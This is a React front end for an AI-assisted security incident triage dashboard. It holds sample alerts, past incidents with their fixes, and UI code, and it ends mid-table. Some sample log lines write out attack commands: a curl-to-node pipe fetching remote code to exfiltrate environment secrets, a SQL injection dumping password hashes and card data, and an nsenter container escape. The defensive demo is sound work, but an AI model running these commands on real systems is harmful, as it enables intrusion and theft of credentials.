import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  Brain,
  Zap,
  CheckCircle2,
  AlertTriangle,
  XCircle,
  History,
  Terminal,
  Database,
  TrendingUp,
  Clock,
  ArrowRight,
  RefreshCw,
  Sliders,
  Layers,
  Activity,
  Check,
  Award,
  Sparkles,
  HelpCircle
} from 'lucide-react';
import MemoryImpactView from './components/MemoryImpactView';

// The 10 comprehensive security incident presets spanning repeat and novel scenarios
const PRESETS = [
  {
    key: 'unusual_outbound_traffic',
    label: '1. Unusual Outbound Traffic (SSRF Metadata Exfil)',
    badge: 'Repeat Type',
    data: {
      alertType: 'unusual_outbound_traffic',
      affectedSystem: 'webhook-dispatcher-01',
      severity: 'high',
      rawLogSnippet: '[SECURITY] 2024-09-28T14:10:02Z HTTP 200 GET to 169.254.169.254/latest/meta-data/iam/security-credentials/ from client webhook proxy worker-04; outbound payload 480MB',
    },
  },
  {
    key: 'brute_force_login',
    label: '2. Brute Force Login (Credential Stuffing Spike)',
    badge: 'Repeat Type',
    data: {
      alertType: 'brute_force_login',
      affectedSystem: 'auth-api-cluster',
      severity: 'high',
      rawLogSnippet: '[AUTH] 2024-09-28T15:20:11Z AuthFailureSpike: 18,500 failed POST /v1/auth/login attempts from subnet 198.51.100.0/24 targeting user admin',
    },
  },
  {
    key: 'privilege_escalation',
    label: '3. Privilege Escalation (Container Escape via nsenter)',
    badge: 'Repeat Type',
    data: {
      alertType: 'privilege_escalation',
      affectedSystem: 'ci-runner-fleet',
      severity: 'critical',
      rawLogSnippet: '[AUDIT] 2024-09-28T16:05:44Z sudo: gitlab-runner : TTY=unknown ; PWD=/builds ; USER=root ; COMMAND=/bin/nsenter -t 1 -m -u -n -i bash',
    },
  },
  {
    key: 'ransomware_activity',
    label: '4. Ransomware Activity (Cryptolock Volume Encryption)',
    badge: 'Repeat Type',
    data: {
      alertType: 'ransomware_activity',
      affectedSystem: 'storage-nfs-prod',
      severity: 'critical',
      rawLogSnippet: '[STORAGE-ALERT] 2024-09-28T11:42:09Z Mass file modification: 52,000 files renamed with extension .cryptolock in /exports/shares within 45s',
    },
  },
  {
    key: 'ddos_traffic_spike',
    label: '5. DDoS Traffic Spike (SYN Reflection Flood)',
    badge: 'Repeat Type',
    data: {
      alertType: 'ddos_traffic_spike',
      affectedSystem: 'edge-ingress-gateway',
      severity: 'critical',
      rawLogSnippet: '[EDGE] 2024-09-28T17:33:00Z SYN flood detected: 9.2 million pps / 48 Gbps targeting /api/v1/checkout from UDP/SYN reflection pool',
    },
  },
  {
    key: 'phishing_credential_harvest',
    label: '6. Phishing & OAuth Hijack (Mailbox Forwarding Rule)',
    badge: 'Repeat Type',
    data: {
      alertType: 'phishing_credential_harvest',
      affectedSystem: 'mail-exchange-online',
      severity: 'high',
      rawLogSnippet: '[M365-ALERT] 2024-09-28T09:12:44Z Mailbox inbox rule created: forward all emails containing invoice, payment, secret to extern-drop@proton.me; OAuth app granted full Mail.ReadWrite',
    },
  },
  {
    key: 'sql_injection_exfil',
    label: '7. SQL Injection Exfiltration (Blind SQLi Database Dump)',
    badge: 'Repeat Type',
    data: {
      alertType: 'sql_injection_exfil',
      affectedSystem: 'order-processing-db',
      severity: 'critical',
      rawLogSnippet: '[DB-WAF] 2024-09-28T18:04:19Z SQLi anomaly detected: query pattern UNION SELECT null, username, password_hash, credit_card FROM customers executed via param id=1042',
    },
  },
  {
    key: 'api_token_leak',
    label: '8. API Secret Exposure (Public Repository Hardcoded Token)',
    badge: 'Repeat Type',
    data: {
      alertType: 'api_token_leak',
      affectedSystem: 'github-sync-service',
      severity: 'high',
      rawLogSnippet: '[GIT-GUARD] 2024-09-28T19:30:15Z Live production AWS secret key AKIAIOSFODNN7EXAMPLE committed to public repository backend-microservices; immediate revocation advisory',
    },
  },
  {
    key: 'supply_chain_tamper',
    label: '9. Supply Chain Anomaly (Compromised NPM Dependency)',
    badge: 'Repeat Type',
    data: {
      alertType: 'supply_chain_tamper',
      affectedSystem: 'web-frontend-builder',
      severity: 'critical',
      rawLogSnippet: '[BUILD-SANDBOX] 2024-09-28T20:15:33Z Postinstall script in event-stream-v3.3.6 spawned curl -s https://pastebin.com/raw/malicious | node attempting env exfiltration during CI build',
    },
  },
  {
    key: 'novel_zero_day',
    label: '10. ⚡ Novel / Zero-Day Incident (Kernel Anomaly Unseen Pattern)',
    badge: 'Zero History',
    data: {
      alertType: 'CryptoKernelCompilation',
      affectedSystem: 'gpu-inference-cluster',
      severity: 'critical',
      rawLogSnippet: '[KERN-SEC] Anomaly: nvcc compilation detected in rootless container worker-gpu-09; unexpected instruction set AVX512_FMA targeting unapproved pool at 192.0.2.77:8080; zero-day driver panic',
    },
  },
];

// 10 Canonical Institutional Memory Examples stored in Hindsight Memory Bank
const FALLBACK_10_EXAMPLES = [
  {
    sequenceNumber: 1,
    id: 'INC-2024-001',
    timestamp: '2024-08-10T09:15:00Z',
    alertType: 'unusual_outbound_traffic',
    affectedSystem: 'billing-export-01',
    severity: 'critical',
    rawLogSnippet: '[NET-SEC] 2024-08-10T09:15:00Z High volume egress: 12.4GB transmitted to external IP 185.220.101.5 on port 443 over 10 minutes',
    fixApplied: 'Terminate process and rotate API keys only without network perimeter rule',
    outcome: 'failed',
    timeToResolveMinutes: 55,
    rootCause: 'Exfiltration via reverse tunnel spawned by backdoor persistence script that re-established on pod restart.',
    memoryAssisted: false,
  },
  {
    sequenceNumber: 2,
    id: 'INC-2024-002',
    timestamp: '2024-08-11T14:20:00Z',
    alertType: 'brute_force_login',
    affectedSystem: 'legacy-portal-ssh',
    severity: 'medium',
    rawLogSnippet: '[SSHD] 2024-08-11T14:20:00Z Failed password for invalid user root from 203.0.113.88 port 51222 ssh2 (3200 attempts)',
    fixApplied: 'Manual IP blacklist on local iptables',
    outcome: 'partial',
    timeToResolveMinutes: 48,
    rootCause: 'Attacker rotated through residential proxies, quickly bypassing individual static IP blocks.',
    memoryAssisted: false,
  },
  {
    sequenceNumber: 3,
    id: 'INC-2024-003',
    timestamp: '2024-08-13T11:05:00Z',
    alertType: 'privilege_escalation',
    affectedSystem: 'k8s-control-plane',
    severity: 'critical',
    rawLogSnippet: '[KUBE-APISERVER] 2024-08-13T11:05:00Z user system:serviceaccount:default:sa-worker created ClusterRoleBinding cluster-admin',
    fixApplied: 'Revoke service account token without mutating RBAC role permissions',
    outcome: 'failed',
    timeToResolveMinutes: 60,
    rootCause: 'Default service account had wildcard bind permissions granted by deprecated Helm chart.',
    memoryAssisted: false,
  },
  {
    sequenceNumber: 4,
    id: 'INC-2024-004',
    timestamp: '2024-08-14T21:40:00Z',
    alertType: 'ransomware_activity',
    affectedSystem: 'backup-vault-02',
    severity: 'critical',
    rawLogSnippet: '[EDR] 2024-08-14T21:40:00Z BitLocker volume encryption initiated by unverified script svchost_enc.ps1 on secondary vault',
    fixApplied: 'Kill powershell process and reboot storage server',
    outcome: 'failed',
    timeToResolveMinutes: 52,
    rootCause: 'Scheduled task persistence triggered automated encryption immediately on reboot before keys were saved.',
    memoryAssisted: false,
  },
  {
    sequenceNumber: 5,
    id: 'INC-2024-005',
    timestamp: '2024-08-16T10:30:00Z',
    alertType: 'ddos_traffic_spike',
    affectedSystem: 'dns-authoritative-ns1',
    severity: 'high',
    rawLogSnippet: '[DNS] 2024-08-16T10:30:00Z Anycast DNS query rate exceeded 250,000 qps for ANY query type from spoofed IP pool',
    fixApplied: 'Increase server CPU instances and restart bind9 service',
    outcome: 'failed',
    timeToResolveMinutes: 45,
    rootCause: 'DNS amplification attack overwhelmed upstream transit link bandwidth, unaffected by compute scaling.',
    memoryAssisted: false,
  },
  {
    sequenceNumber: 6,
    id: 'INC-2024-006',
    timestamp: '2024-08-17T13:25:00Z',
    alertType: 'phishing_credential_harvest',
    affectedSystem: 'mail-exchange-online',
    severity: 'high',
    rawLogSnippet: '[M365] 2024-08-17T13:25:00Z Mailbox inbox rule created: forward all emails containing invoice, payment, secret to extern-drop@proton.me',
    fixApplied: 'Delete forwarding rule and reset user password only',
    outcome: 'partial',
    timeToResolveMinutes: 40,
    rootCause: 'OAuth consent grant remained authorized, allowing third-party app to keep reading mail without password.',
    memoryAssisted: false,
  },
  {
    sequenceNumber: 7,
    id: 'INC-2024-007',
    timestamp: '2024-08-19T14:22:00Z',
    alertType: 'unusual_outbound_traffic',
    affectedSystem: 'webhook-dispatcher-01',
    severity: 'high',
    rawLogSnippet: '[SECURITY] 2024-08-19T14:22:00Z HTTP 200 GET to 169.254.169.254/latest/meta-data/iam/security-credentials/ from client webhook proxy worker-04; egress payload 450MB',
    fixApplied: 'Enforce IMDSv2 and deploy Calico network egress policy blocking 169.254.169.254/32',
    outcome: 'success',
    timeToResolveMinutes: 18,
    rootCause: 'SSRF vulnerability in URL parser permitted access to AWS cloud metadata endpoint.',
    memoryAssisted: true,
  },
  {
    sequenceNumber: 8,
    id: 'INC-2024-008',
    timestamp: '2024-08-21T09:10:00Z',
    alertType: 'brute_force_login',
    affectedSystem: 'auth-api-cluster',
    severity: 'high',
    rawLogSnippet: '[AUTH] 2024-08-21T09:10:00Z 14,200 failed logins in 5 min targeting administrative accounts across distributed botnet IPs',
    fixApplied: 'Deploy Cloudflare WAF managed challenge rule and enforce IP rate-limiting at ingress controller',
    outcome: 'success',
    timeToResolveMinutes: 14,
    rootCause: 'Distributed botnet executing automated dictionary attacks against unthrottled OAuth token endpoint.',
    memoryAssisted: true,
  },
  {
    sequenceNumber: 9,
    id: 'INC-2024-009',
    timestamp: '2024-08-23T16:45:00Z',
    alertType: 'privilege_escalation',
    affectedSystem: 'ci-runner-fleet',
    severity: 'critical',
    rawLogSnippet: '[CONTAINER-AUDIT] 2024-08-23T16:45:00Z Container breakout: nsenter syscall executed from untrusted build container runner-42',
    fixApplied: 'Remove hostPID and privileged securityContext flags from PodSpec and enforce Kyverno restricted profile',
    outcome: 'success',
    timeToResolveMinutes: 16,
    rootCause: 'Misconfigured privileged runner daemon permitted nsenter host namespace escape.',
    memoryAssisted: true,
  },
  {
    sequenceNumber: 10,
    id: 'INC-2024-010',
    timestamp: '2024-08-25T11:15:00Z',
    alertType: 'ransomware_activity',
    affectedSystem: 'storage-nfs-prod',
    severity: 'critical',
    rawLogSnippet: '[STORAGE-ALERT] 2024-08-25T11:15:00Z High frequency rename detected: 14,000 files renamed to .locked in 30 seconds',
    fixApplied: 'Isolate NFS export subnet immediately, snapshot ZFS pool, and rotate Kerberos service principal tickets',
    outcome: 'success',
    timeToResolveMinutes: 15,
    rootCause: 'Compromised contractor workstation wrote encrypted blocks across unsegmented NFS mount.',
    memoryAssisted: true,
  },
];

export default function App() {
  const [selectedPresetKey, setSelectedPresetKey] = useState(PRESETS[0].key);
  const [formInput, setFormInput] = useState(PRESETS[0].data);
  const [analyzing, setAnalyzing] = useState(false);
  const [currentResult, setCurrentResult] = useState(null);
  const [scoreboard, setScoreboard] = useState(null);
  const [allIncidents, setAllIncidents] = useState([]);
  const [loadingScoreboard, setLoadingScoreboard] = useState(false);
  const [error, setError] = useState(null);

  // Active Navigation Tab: 'triage' or 'analytics'
  const [activeTab, setActiveTab] = useState('triage');
  const [analyticsKey, setAnalyticsKey] = useState(0);

  // Panel 3 Memory Trail View Mode: 'matches' or 'bank'
  const [memoryViewMode, setMemoryViewMode] = useState('bank');

  // Modal / Form state for resolving an open incident
  const [showResolveModal, setShowResolveModal] = useState(false);
  const [resolvingIncident, setResolvingIncident] = useState(null);
  const [resolveFix, setResolveFix] = useState('');
  const [resolveOutcome, setResolveOutcome] = useState('success');
  const [resolveTime, setResolveTime] = useState(15);
  const [resolveRootCause, setResolveRootCause] = useState('');
  const [savingResolution, setSavingResolution] = useState(false);

  // Fetch Scoreboard & Incidents on load
  const fetchDashboardData = async () => {
    setLoadingScoreboard(true);
    try {
      const [scoreRes, incRes] = await Promise.all([
        fetch('/api/scoreboard'),
        fetch('/api/incidents'),
      ]);

      if (scoreRes.ok) {
        const scoreData = await scoreRes.json();
        setScoreboard(scoreData);
      }
      if (incRes.ok) {
        const incData = await incRes.json();
        setAllIncidents(incData);
      }
      setAnalyticsKey((k) => k + 1);
    } catch (err) {
      console.error('Failed to load scoreboard data:', err);
    } finally {
      setLoadingScoreboard(false);
    }
  };

  useEffect(() => {
    fetchDashboardData();
  }, []);

  // Handle Preset Selection
  const handleSelectPreset = (key) => {
    setSelectedPresetKey(key);
    const found = PRESETS.find((p) => p.key === key);
    if (found) {
      setFormInput({ ...found.data });
      setError(null);
    }
  };

  // Load an example memory record into Panel 1 input for immediate triage
  const handleLoadIncidentIntoTriage = (inc) => {
    setFormInput({
      alertType: inc.alertType || '',
      affectedSystem: inc.affectedSystem || 'system-01',
      severity: inc.severity || 'high',
      rawLogSnippet: inc.rawLogSnippet || `[ALERT] ${inc.alertType} event detected on ${inc.affectedSystem}`,
    });
    const matched = PRESETS.find(p => p.data.alertType === inc.alertType);
    if (matched) {
      setSelectedPresetKey(matched.key);
    }
    setError(null);
  };

  // Analyze Incident (POST /api/incidents)
  const handleAnalyze = async (e) => {
    if (e) e.preventDefault();
    setAnalyzing(true);
    setError(null);

    try {
      const res = await fetch('/api/incidents', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formInput),
      });

      if (!res.ok) {
        const errJson = await res.json();
        throw new Error(errJson.message || `Server returned ${res.status}`);
      }

      const data = await res.json();
      setCurrentResult(data);
      setMemoryViewMode('matches');

      // Refresh scoreboard & history list
      fetchDashboardData();
    } catch (err) {
      console.error('Error during triage:', err);
      setError(err.message || 'Failed to triage incident.');
    } finally {
      setAnalyzing(false);
    }
  };

  // Open Resolve Modal
  const openResolveDialog = (incident) => {
    const defaultFix = currentResult?.whatIf?.candidates?.[0]?.fixApplied ||
      currentResult?.recommendation ||
      'Applied approved network containment policy';
    const defaultRootCause = currentResult?.likelyRootCause || 'Identified root cause during diagnostic triage';

    setResolvingIncident(incident);
    setResolveFix(defaultFix);
    setResolveOutcome('success');
    setResolveTime(15);
    setResolveRootCause(defaultRootCause);
    setShowResolveModal(true);
  };

  // Submit Resolve (POST /api/incidents/:id/resolve)
  const handleSaveResolution = async (e) => {
    if (e) e.preventDefault();
    if (!resolvingIncident) return;

    setSavingResolution(true);
    try {
      const res = await fetch(`/api/incidents/${resolvingIncident.id}/resolve`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fixApplied: resolveFix,
          outcome: resolveOutcome,
          rootCause: resolveRootCause,
          timeToResolveMinutes: Number(resolveTime),
        }),
      });

      if (!res.ok) {
        throw new Error(`Failed to resolve incident: ${res.statusText}`);
      }

      setShowResolveModal(false);
      setResolvingIncident(null);

      // Immediately refresh scoreboard to watch metrics change live
      await fetchDashboardData();
    } catch (err) {
      alert(`Error saving resolution: ${err.message}`);
    } finally {
      setSavingResolution(false);
    }
  };

  const hasMemoryMatch = currentResult && currentResult.memoryTrail && currentResult.memoryTrail.length > 0;
  const isNovelIncident = currentResult && !hasMemoryMatch;

  return (
    <div className="container">
      {/* Header */}
      <header className="header">
        <div className="logo-group">
          <div className="logo-badge">
            <ShieldAlert size={26} color="#fff" />
          </div>
          <div className="title-wrap">
            <h1>SentinelMind</h1>
            <p>Autonomous AI Security Incident Response Agent with Hindsight Persistent Memory</p>
          </div>
        </div>

        <div className="badges-group">
          <div className="tech-tag tech-tag-hindsight">
            <Brain size={14} className="pulse-icon" />
            <span>Hindsight Memory: Active (sentinelmind-incidents)</span>
          </div>
          <div className="tech-tag tech-tag-groq">
            <Zap size={14} />
            <span>Groq LPU (gpt-oss-120b)</span>
          </div>
          <button className="btn-refresh" onClick={fetchDashboardData} title="Refresh Dashboard">
            <RefreshCw size={14} className={loadingScoreboard ? 'spin' : ''} />
          </button>
        </div>
      </header>

      {/* Top Tab Navigation */}
      <nav className="tab-navigation-bar">
        <button
          type="button"
          className={`tab-btn ${activeTab === 'triage' ? 'tab-btn-active' : ''}`}
          onClick={() => setActiveTab('triage')}
        >
          <Terminal size={17} />
          <span>Live Incident Triage</span>
        </button>
        <button
          type="button"
          className={`tab-btn ${activeTab === 'analytics' ? 'tab-btn-active' : ''}`}
          onClick={() => setActiveTab('analytics')}
        >
          <TrendingUp size={17} />
          <span>Memory Impact & Analysis</span>
          <span className="tab-proof-badge">Proof Metric</span>
        </button>
      </nav>

      {/* Main Tab Content */}
      {activeTab === 'triage' ? (
        <div className="four-panel-grid">
          {/* PANEL 1: INCIDENT INPUT */}
        <section className="panel panel-input">
          <div className="panel-header">
            <div className="panel-title">
              <Terminal size={18} className="panel-icon text-cyan" />
              <h2>1. Incident Input & Ingestion</h2>
            </div>
            <span className="panel-tag">Live Triage</span>
          </div>

          <form onSubmit={handleAnalyze} className="panel-body">
            {/* Preset Selector */}
            <div className="form-group">
              <label>Select Preset Incident Scenario:</label>
              <div className="select-wrap">
                <select
                  value={selectedPresetKey}
                  onChange={(e) => handleSelectPreset(e.target.value)}
                  className="preset-select"
                >
                  {PRESETS.map((p) => (
                    <option key={p.key} value={p.key}>
                      {p.label} [{p.badge}]
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* Alert Type & System Grid */}
            <div className="input-row">
              <div className="form-group flex-1">
                <label>Alert Type:</label>
                <input
                  type="text"
                  value={formInput.alertType}
                  onChange={(e) => setFormInput({ ...formInput, alertType: e.target.value })}
                  placeholder="e.g. unusual_outbound_traffic"
                  required
                />
              </div>

              <div className="form-group flex-1">
                <label>Affected System:</label>
                <input
                  type="text"
                  value={formInput.affectedSystem}
                  onChange={(e) => setFormInput({ ...formInput, affectedSystem: e.target.value })}
                  placeholder="e.g. webhook-dispatcher-01"
                  required
                />
              </div>

              <div className="form-group w-auto">
                <label>Severity:</label>
                <select
                  value={formInput.severity}
                  onChange={(e) => setFormInput({ ...formInput, severity: e.target.value })}
                  className={`severity-select sev-${formInput.severity}`}
                >
                  <option value="critical">Critical</option>
                  <option value="high">High</option>
                  <option value="medium">Medium</option>
                  <option value="low">Low</option>
                </select>
              </div>
            </div>

            {/* Raw Log Snippet */}
            <div className="form-group">
              <label>Raw Security Log Snippet:</label>
              <textarea
                rows={4}
                value={formInput.rawLogSnippet}
                onChange={(e) => setFormInput({ ...formInput, rawLogSnippet: e.target.value })}
                className="mono-code"
                placeholder="Paste raw security syslog, audit trail, or alert payload..."
                required
              />
            </div>

            {error && <div className="error-banner">{error}</div>}

            <button type="submit" className="btn-analyze" disabled={analyzing}>
              {analyzing ? (
                <>
                  <RefreshCw size={16} className="spin" />
                  <span>Querying Hindsight & Triaging with Groq...</span>
                </>
              ) : (
                <>
                  <Zap size={16} />
                  <span>Analyze Incident (Run Memory Triage)</span>
                </>
              )}
            </button>
          </form>
        </section>

        {/* PANEL 2: AGENT RECOMMENDATION */}
        <section className="panel panel-recommendation">
          <div className="panel-header">
            <div className="panel-title">
              <Brain size={18} className="panel-icon text-purple" />
              <h2>2. Agent Recommendation</h2>
            </div>
            {currentResult && (
              <span className={`confidence-badge conf-${currentResult.confidence}`}>
                {currentResult.confidence?.toUpperCase()} CONFIDENCE
              </span>
            )}
          </div>

          <div className="panel-body">
            {!currentResult ? (
              <div className="empty-state">
                <HelpCircle size={36} className="empty-icon" />
                <p>No active triage report yet.</p>
                <span>Select a scenario in Panel 1 and click "Analyze Incident" to run persistent memory triage.</span>
              </div>
            ) : (
              <div className="recommendation-content">
                {/* Memory Match Banner */}
                {hasMemoryMatch ? (
                  <div className="memory-banner memory-banner-matched">
                    <CheckCircle2 size={18} className="banner-icon" />
                    <div>
                      <strong>Matched Institutional Memory via Hindsight:</strong>{' '}
                      <span>
                        Correlated to {currentResult.matchedPastIncidentIds?.join(', ') || 'past incident'}.
                        Applying proven historical remediation playbook.
                      </span>
                    </div>
                  </div>
                ) : (
                  <div className="memory-banner memory-banner-novel">
                    <AlertTriangle size={18} className="banner-icon" />
                    <div>
                      <strong>No Historical Precedent in Memory (Novel Incident):</strong>{' '}
                      <span>Delivering first-principles diagnostic triage. No past playbook available.</span>
                    </div>
                  </div>
                )}

                {/* Fix Recommendation Box */}
                <div className="triage-card triage-card-action">
                  <div className="triage-card-header">
                    <Zap size={16} className="text-amber" />
                    <span>Recommended Remediation</span>
                  </div>
                  <div className="triage-card-body action-text">
                    {currentResult.recommendation}
                  </div>
                </div>

                {/* Likely Root Cause */}
                <div className="triage-card">
                  <div className="triage-card-header">
                    <Sliders size={16} className="text-cyan" />
                    <span>Identified Likely Root Cause</span>
                  </div>
                  <div className="triage-card-body rootcause-text">
                    {currentResult.likelyRootCause}
                  </div>
                </div>

                {/* AI Reasoning */}
                <div className="triage-card">
                  <div className="triage-card-header">
                    <Activity size={16} className="text-blue" />
                    <span>Triage Reasoning & Memory Correlation</span>
                  </div>
                  <div className="triage-card-body reasoning-text">
                    {currentResult.reasoning}
                  </div>
                </div>

                {/* Open Incident Action Button */}
                {currentResult.incident?.status === 'open' && (
                  <div className="resolve-prompt-bar">
                    <span>Incident status: <strong>OPEN</strong></span>
                    <button
                      className="btn-resolve-trigger"
                      onClick={() => openResolveDialog(currentResult.incident)}
                    >
                      <Check size={14} />
                      <span>Resolve & Learn This Incident</span>
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>
        </section>

        {/* PANEL 3: MEMORY TRAIL */}
        <section className="panel panel-memory">
          <div className="panel-header">
            <div className="panel-title">
              <History size={18} className="panel-icon text-green" />
              <h2>3. Memory Trail (Hindsight Recalled)</h2>
            </div>
            <div className="memory-sub-nav">
              <button
                type="button"
                className={`btn-sub-toggle ${memoryViewMode === 'bank' ? 'active' : ''}`}
                onClick={() => setMemoryViewMode('bank')}
              >
                10 Examples Bank
              </button>
              {currentResult && (
                <button
                  type="button"
                  className={`btn-sub-toggle ${memoryViewMode === 'matches' ? 'active' : ''}`}
                  onClick={() => setMemoryViewMode('matches')}
                >
                  Live Matches ({currentResult?.memoryTrail?.length || 0})
                </button>
              )}
            </div>
          </div>

          <div className="panel-body">
            {memoryViewMode === 'bank' ? (
              <div className="memory-bank-view">
                <div className="memory-bank-banner">
                  <Brain size={16} className="text-purple flex-shrink-0" />
                  <span>
                    <strong>Hindsight Institutional Memory Bank (10 Examples):</strong> Chronological records of security remediations retained in vector memory. Click <em>"Load into Triage Input"</em> to test.
                  </span>
                </div>

                <div className="memory-timeline">
                  {(allIncidents && allIncidents.length >= 10 ? allIncidents.slice(0, 10) : FALLBACK_10_EXAMPLES).map((past, idx) => (
                    <div key={past.id || idx} className="timeline-item">
                      <div className="timeline-marker">
                        <div className={`marker-dot dot-${past.outcome || 'success'}`}></div>
                        {idx < 9 && <div className="marker-line"></div>}
                      </div>

                      <div className="timeline-card">
                        <div className="timeline-card-header">
                          <div className="timeline-id-wrap">
                            <span className="incident-seq-pill">#{past.sequenceNumber || idx + 1}</span>
                            <span className="incident-id-badge">{past.id}</span>
                            <span className="timeline-date">
                              {past.timestamp ? new Date(past.timestamp).toLocaleDateString() : 'Historical'}
                            </span>
                          </div>
                          <div className="timeline-badges">
                            <span className={`outcome-pill outcome-${past.outcome || 'success'}`}>
                              {(past.outcome || 'SUCCESS').toUpperCase()}
                            </span>
                            {past.timeToResolveMinutes && (
                              <span className="time-pill">
                                <Clock size={12} />
                                <span>{past.timeToResolveMinutes}m</span>
                              </span>
                            )}
                          </div>
                        </div>

                        <div className="timeline-system-tag">
                          <span className="mono-label">Target:</span>
                          <span className="mono text-cyan">{past.affectedSystem}</span>
                          <span className="alert-type-pill">{past.alertType}</span>
                        </div>

                        <div className="timeline-reason">
                          {past.memoryAssisted
                            ? `✓ Hindsight Memory Recalled: Recurring pattern match with verified remediation playbook.`
                            : `⚠️ Baseline Unassisted Incident: Initial trial-and-error discovery phase.`}
                        </div>

                        <div className="timeline-fix">
                          <strong>Fix Applied:</strong> {past.fixApplied}
                        </div>

                        {past.rootCause && (
                          <div className="timeline-rootcause">
                            <strong>Root Cause:</strong> {past.rootCause}
                          </div>
                        )}

                        <div className="timeline-actions">
                          <button
                            type="button"
                            className="btn-load-incident"
                            onClick={() => handleLoadIncidentIntoTriage(past)}
                          >
                            <span>Load into Triage Input</span>
                            <ArrowRight size={13} />
                          </button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              /* Live Matches View */
              !currentResult ? (
                <div className="empty-state">
                  <Database size={36} className="empty-icon" />
                  <p>Memory Trail is idle.</p>
                  <span>Recalled past incidents will appear here as a chronological timeline during triage.</span>
                </div>
              ) : currentResult.memoryTrail?.length === 0 ? (
                <div className="empty-state empty-state-novel">
                  <AlertTriangle size={32} className="text-muted" />
                  <p>Empty Memory Trail (0 Matches)</p>
                  <span>Zero historical incidents match this alert signature in Hindsight memory.</span>
                </div>
              ) : (
                <div className="memory-timeline">
                  {currentResult.memoryTrail.map((past, idx) => (
                    <div key={past.id || idx} className="timeline-item">
                      <div className="timeline-marker">
                        <div className="marker-dot"></div>
                        {idx < currentResult.memoryTrail.length - 1 && <div className="marker-line"></div>}
                      </div>

                      <div className="timeline-card">
                        <div className="timeline-card-header">
                          <div className="timeline-id-wrap">
                            <span className="incident-id-badge">{past.id}</span>
                            <span className="timeline-date">
                              {past.date ? new Date(past.date).toLocaleDateString() : 'Historical'}
                            </span>
                          </div>
                          <div className="timeline-badges">
                            <span className={`outcome-pill outcome-${past.outcome}`}>
                              {past.outcome?.toUpperCase() || 'UNKNOWN'}
                            </span>
                            {past.timeToResolveMinutes && (
                              <span className="time-pill">
                                <Clock size={12} />
                                <span>{past.timeToResolveMinutes}m</span>
                              </span>
                            )}
                          </div>
                        </div>

                        <div className="timeline-reason">{past.similarityReason}</div>

                        <div className="timeline-fix">
                          <strong>Fix Applied:</strong> {past.fixApplied}
                        </div>

                        {past.rootCause && (
                          <div className="timeline-rootcause">
                            <strong>Root Cause:</strong> {past.rootCause}
                          </div>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )
            )}
          </div>
        </section>

        {/* PANEL 4: SCOREBOARD & WHAT-IF */}
        <section className="panel panel-scoreboard">
          <div className="panel-header">
            <div className="panel-title">
              <TrendingUp size={18} className="panel-icon text-amber" />
              <h2>4. Scoreboard & What-If Engine</h2>
            </div>
            <span className="panel-tag text-green">Code Computed</span>
          </div>

          <div className="panel-body">
            {/* HEADLINE MEMORY IMPACT CARD (Judges Headline Proof) */}
            {scoreboard?.memoryImpact && (
              <div className="memory-impact-banner">
                <div className="impact-left">
                  <div className="impact-badge">
                    <Award size={16} />
                    <span>HINDSIGHT PROOF METRIC</span>
                  </div>
                  <h3>
                    <span className="highlight-percent">
                      {scoreboard.memoryImpact.percentImprovement}% Faster
                    </span>{' '}
                    Resolution with Memory
                  </h3>
                  <p>
                    Autonomous recall saves SecOps teams over{' '}
                    {Math.round(scoreboard.memoryImpact.unassistedAvgTime - scoreboard.memoryImpact.assistedAvgTime)} minutes
                    per incident by immediately applying proven playbook fixes.
                  </p>
                </div>

                <div className="impact-stats-grid">
                  <div className="impact-stat-box assisted">
                    <div className="stat-label">With Memory</div>
                    <div className="stat-val">{scoreboard.memoryImpact.assistedAvgTime} min</div>
                    <div className="stat-sub">{scoreboard.memoryImpact.assistedCount} incidents</div>
                  </div>
                  <div className="impact-stat-box unassisted">
                    <div className="stat-label">Without Memory</div>
                    <div className="stat-val">{scoreboard.memoryImpact.unassistedAvgTime} min</div>
                    <div className="stat-sub">{scoreboard.memoryImpact.unassistedCount} incidents</div>
                  </div>
                </div>
              </div>
            )}

            {/* Scoreboard Overall Metrics */}
            <div className="scoreboard-overview-grid">
              <div className="overview-metric-card">
                <span className="metric-title">Total Incidents</span>
                <span className="metric-value">{scoreboard?.overall?.totalIncidents || 0}</span>
              </div>
              <div className="overview-metric-card">
                <span className="metric-title">Resolved</span>
                <span className="metric-value">{scoreboard?.overall?.resolvedCount || 0}</span>
              </div>
              <div className="overview-metric-card">
                <span className="metric-title">Success Rate</span>
                <span className="metric-value text-green">
                  {scoreboard?.overall?.overallSuccessRate || 0}%
                </span>
              </div>
              <div className="overview-metric-card">
                <span className="metric-title">Avg Resolve Time</span>
                <span className="metric-value text-cyan">
                  {scoreboard?.overall?.avgTimeToResolve || 0}m
                </span>
              </div>
            </div>

            {/* What-If Scenario Section */}
            <div className="whatif-container">
              <div className="whatif-header">
                <div className="whatif-title">
                  <Sparkles size={16} className="text-purple" />
                  <span>
                    What-If Candidate Fix Analysis ({currentResult?.incident?.alertType || formInput.alertType})
                  </span>
                </div>
              </div>

              {/* LLM Summary */}
              {currentResult?.whatIf?.summary && (
                <div className="whatif-ai-summary">
                  <p><strong>LLM Comparative Analysis:</strong> {currentResult.whatIf.summary}</p>
                </div>
              )}

              {/* Candidates Table */}
              <div className="table-responsive">
                <table className="whatif-table">
                  <thead>
                    <tr>
                      <th>Rank</th>
                      <th>Candidate Fix</th>
                      <th>Success Rate</th>
                      <th>Avg Resolve Time</th>
                      <th>Times Used</th>
                      <th>Sample Flag</th>
                    </tr>
                  </thead>
                  <tbody>
                    {(currentResult?.whatIf?.candidates || []).length === 0 ? (
                      <tr>
                        <td colSpan={6} className="text-center py-3 text-muted">
                          No candidate fixes recorded for this alert type yet.
                        </td>
                      </tr>
                    ) : (
                      currentResult.whatIf.candidates.map((c) => (
                        <tr key={c.fixApplied} className={c.recommendedRank === 1 ? 'row-recommended' : ''}>
                          <td>
                            <span className={`rank-pill rank-${c.recommendedRank}`}>
                              #{c.recommendedRank}
                            </span>
                          </td>
                          <td className="fix-name-cell">
                            <strong>{c.fixApplied}</strong>
                          </td>
                          <td>
                            <span className={c.successRate >= 80 ? 'text-green font-bold' : c.successRate > 0 ? 'text-amber' : 'text-red'}>
                              {c.successRate}%
                            </span>
                          </td>
                          <td>{c.avgTimeToResolve}m</td>
